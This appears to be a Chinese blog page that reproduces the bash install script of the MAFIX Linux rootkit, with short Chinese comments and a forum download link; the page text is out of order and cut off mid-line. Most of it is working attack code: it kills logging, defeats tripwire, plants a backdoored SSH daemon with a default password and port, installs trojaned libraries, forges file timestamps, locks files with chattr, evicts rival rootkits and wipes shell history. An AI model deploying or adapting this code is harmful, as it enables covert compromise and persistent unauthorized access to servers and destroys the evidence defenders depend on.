/etc/ttyhash</p><p>fi</p><p>&nbsp;</p><p>if [ -d /lib/ldd.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so/*</p><p>&nbsp; &nbsp;mv /lib/ldd.so $HOMEDIR/.owned/tk8</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk8 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/src/.puta ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta/*</p><p>&nbsp; &nbsp;mv /usr/src/.puta $HOMEDIR/.owned/tk7</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk7 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/xntpd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/xntpd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/xntpd</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/nscd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/nscd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/nscd</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/include/bex ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz</p><p>&nbsp; &nbsp;chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex/*</p><p>&nbsp; &nbsp;mv /usr/include/bex/ $HOMEDIR/.owned/bex2</p><p>&nbsp; &nbsp;if [ -f /var/log/tcp.log ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa /var/log/tcp.log</p><p>&nbsp; &nbsp; &nbsp; cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} bex2 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /dev/tux/ ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /dev/tux &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;mv /dev/tux $HOMEDIR/.owned/tuxkit</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tuxkit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/bin/ssh2d ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ssh2d</p><p>&nbsp; &nbsp;rm -rf /usr/bin/ssh2d</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/*</p><p>&nbsp; &nbsp;rm -rf /lib/security/.config</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} optickit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/ld.so.hash ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/ld.so.hash</p><p>&nbsp; &nbsp;rm -rf /etc/ld.so.hash</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>chattr +isa /usr/lib/libsh</p><p>chattr +isa /lib/libsh.so</p><p>&nbsp;</p><p># GREPPING SHITZ FROM rc.sysinit and inetd.conf</p><p>&nbsp;</p><p>if [ -f /etc/rc.d/rc.sysinit ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;cat /etc/rc.d/rc.sysinit | grep -v &quot;# Xntps (NTPv3 daemon) startup..&quot;| grep -v &quot;/us\nr/sbin/xntps&quot;| grep -v &quot;/usr/sbin/nscd&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;chmod +x /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/inetd.conf ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/inetd.conf</p><p>&nbsp; &nbsp;cat /etc/inetd.conf | grep -v &quot;6635&quot;| grep -v &quot;9705&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/inted.conf /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/inetd.conf</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p># KILLING SOME LAMME DAEMONS</p><p>&nbsp;</p><p>killall -9 -q nscd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xntps &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mountd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mserv &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q psybnc &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q t0rns &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q linsniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q lpsched &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniff &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sn1f &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xsf &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xchk &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q ssh2d &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} sysinfo:${RES}&quot;</p><p>MYIPADDR=`/sbin/ifconfig eth0 | grep &quot;inet addr:&quot; | awk -F ' ' ' {print $2} ' | cut -c6-`</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; hostname :${CYN} `hostname -f` ($MYIPADDR)${RES}&quot;</p><p>uname -a | awk '{ print &nbsp;$11 }' &gt;/tmp/info_tmp</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; arch: ${CYN}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}&quot;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; alternative ip: ${CYN} &quot;`hostname -i`&quot; -+- &nbsp;Might be [&quot;`/sbin/ifconfig | grep eth | wc -l`&quot; ] active adapters.${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /etc/redhat-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/redhat-release`${RES}&quot;</p><p>elif [ -f /etc/slackware-version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/slackware-version`${RES}&quot;</p><p>elif [ -f /etc/debian_version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/debian_version`${RES}&quot;</p><p>elif [ -f /etc/SuSE-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/SuSE-release`${RES}&quot;</p><p>elif [ -f /etc/issue ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/issue`${RES}&quot;</p><p>else echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} unknown${RES}&quot;</p><p>fi</p><p>echo</p><p>echo -n &quot;${CYN}mafix!${DMAG} &gt; cleaning up some traces... ${RES}&quot;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>if [ -f /.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /.bash_history &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /.bash_history</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/.bash_history</p><p>&nbsp; &nbsp;rm -rf /bin/.bash_history</p><p>fi</p><p>cd $BASEDIR</p><p>rm -rf /tmp/.r*</p><p>cd ..</p><p>rm -rf mafix*</p><p>echo -n &quot;${CYN}done!${RES}&quot;</p><p>echo</p><p>rm -rf /tmp/info_tmp</p><p>endtime=`date +%S`</p><p>echo</p><p>echo</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password: $1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp;  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Port: $2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /usr/sbin/syslogd ]; then</p><p>&nbsp; &nbsp;/usr/sbin/syslogd -m 0</p><p>else</p><p>&nbsp; &nbsp;/sbin/syslogd -m 0</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/inetd ]; then</p><p>&nbsp; &nbsp;killall -HUP inetd &gt;/dev/null 2&gt;&amp;1</p><p>elif [ -f /usr/sbin/xinetd ]; then</p><p>&nbsp; &nbsp;killall -HUP xinetd</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>MAFIX - Linux 2.6 rootkit</p><p>这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。</p><p>下载地址：</p><p>https://forum.eviloctal.com/attachment.php?aid=13419</p><p>内容：</p><p>MAXFIX</p><p>---HOW-TO</p><p>---mafix</p><p>---mafixlibs &nbsp;</p><p>---root</p><p>&nbsp;</p><p>下面为root的内容，也就是安装脚本。</p><p>#!/bin/bash</p><p>######################</p><p># mafix 0.2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p># fud 2009/07/15 &nbsp; &nbsp; #</p><p>######################</p><p>&nbsp;</p><p>BASEDIR=`pwd`</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>BLK=' [1;30m'</p><p>MAG=' [1;35m'</p><p>CYN=' [1;30m'</p><p>RED='^[[1;32m'</p><p>DMAG=' [1;37m'</p><p>RES=' [0m'</p><p>&nbsp;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG}- the ferrari of rootkits - ${RES}&quot;</p><p>sleep 5</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} extracting libs...${RES}&quot;</p><p>tar zxf mafixlibs</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} you need to be root to backdoor the box...${RES}&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>cd $BASEDIR</p><p>sleep 1</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>startime=`date +%S`</p><p>&nbsp;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdooring box...${RES}&quot;</p><p>SYSLOGCONF=&quot;/etc/syslog.conf&quot;</p><p>REMOTE=`grep -v &quot;^#&quot; &quot;$SYSLOGCONF&quot; | grep -v &quot;^$&quot; | grep &quot;@&quot; | cut -d '@' -f 2`</p><p>if [ ! -z &quot;$REMOTE&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Remote logging found! I hope you got access to these box:${RES}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for host in $REMOTE; do</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo -n &quot; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $host</p><p>&nbsp; &nbsp; &nbsp; &nbsp; done</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo ' ${CYN}coz this box is logging to it${RES}'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no remote logging found...${RES}&quot;</p><p>fi</p><p>uname=`uname -n`</p><p>twd=/var/lib/tripwire/$uname.twd</p><p>if [ -d /etc/tripwire ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WARNING: TRIPWIRE FOUND!${RES}&quot;</p><p>if [ -f /var/lib/tripwire/$uname.twd ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa $twd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#去保护，如果有的话，覆盖，chattr +isa 写保护</p><p>&nbsp; &nbsp;else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire db found...${RES}&quot;</p><p>&nbsp; &nbsp;fi</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire was detected..${RES}&quot;</p><p>fi</p><p># restoring login</p><p>if [ -f /sbin/xlogin ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/xlogin</p><p>&nbsp; &nbsp;chattr -isa /bin/login</p><p>&nbsp; &nbsp;mv -f /sbin/xlogin /bin/login</p><p>&nbsp; &nbsp;chmod 7455 /bin/login</p><p>&nbsp; &nbsp;chattr +isa /bin/login</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} installing trojans...${RES}&quot;</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; chattr -isa /etc/sh.conf</p><p>&nbsp; rm -rf /etc/sh.conf</p><p>fi</p><p># checking if we got needed libs and filez</p><p>if [ ! -f /lib/libproc.a ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.a /lib/ 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ ! -f /lib/libproc.so.2.0.6 ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.so.2.0.6 /lib/ 2&gt;/dev/null</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} hold on...${RES}&quot;</p><p>/sbin/ldconfig &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>if [ ! -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;touch -acmr /bin/ls bin/md5sum</p><p>&nbsp; &nbsp;cp bin/md5sum /usr/bin/md5sum</p><p>fi</p><p>DEFPASS=race</p><p>DEFPORT=11111</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $1${RES}&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#生成密码文件</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPASS${RES}&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>chattr +isa /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#写保护</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Port:${DMAG} $2${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPORT${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp;&nbsp;</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $B\nASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ -f /lib/lidps1.so ]; then</p><p>&nbsp; chattr -isa /lib/lidps1.so</p><p>&nbsp; rm -rf /lib/lidps1.so</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/hosts.h ]; then</p><p>&nbsp; chattr -isa /usr/include/hosts.h</p><p>&nbsp; rm -rf /usr/include/hosts.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/file.h ]; then</p><p>&nbsp; chattr -isa /usr/include/file.h</p><p>&nbsp; rm -rf /usr/include/file.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/log.h ]; then</p><p>&nbsp; chattr -isa /usr/include/log.h</p><p>&nbsp; rm -rf /usr/include/log.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/proc.h ]; then</p><p>&nbsp; chattr -isa /usr/include/proc.h</p><p>&nbsp; rm -rf /usr/include/proc.h</p><p>fi</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>mv $BASEDIR/bin/headers/lidps1.so /lib/lidps1.so 2&gt;/dev/null</p><p>touch -acmr /bin/ls /lib/lidps1.so &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #修改文件时间与/bin/ls 时间相同</p><p>touch -acmr /bin/ls $BASEDIR/bin/headers/* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#修改时间</p><p>mv $BASEDIR/bin/headers/* &nbsp;/usr/include/ 2&gt;/dev/null</p><p>&nbsp;</p><p># Ok lets start creating dirs</p><p>&nbsp;</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so/*</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh/*</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/ 2&gt;/dev/null</p><p>mv .sh/.bashrc $HOMEDIR 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;chattr -isa 